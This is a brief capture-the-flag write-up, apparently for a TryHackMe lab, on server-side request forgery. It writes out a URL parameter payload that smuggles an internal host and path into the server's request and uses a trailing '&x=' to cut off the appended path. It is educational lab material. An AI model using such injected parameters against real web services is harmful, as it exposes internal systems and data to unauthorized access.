# Task2: SSRF Examples
## Problem
Using what you've learnt, try changing the address in the browser below to force the webserver to return data from `https://server.website.thm/flag?id=9`. To make things easier the Server Requesting bar at the bottom of the mock browser will show the URL that website.thm is requesting.

The Orginal URL in browse: `https://website.thm/item/2?server=api`

## Soultion
由 `https://website.thm/item/2?server=api` 可以得出以下重要信息:
```sh
# 服务器会将 server=api 插入到某个内部 URL 构造逻辑中，很可能构造方式是这样的：
fetch("https://" + $_GET['server'] + ".website.thm/api/item/2")
```

So我们要让服务器最终发起的请求是：
```sh
https://server.website.thm/flag?id=9
```

那 Payload 应该设计成：
```sh
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=

# 上述 Payload 经过服务器拼接后，最终会形成：
https://server.website.thm/flag?id=9&x=.website.thm/api/item/2

# 值得注意的是：`&x=` 会中断后续拼接路径，即 `&x=...` 是无用参数哦!
https://server.website.thm/flag?id=9
```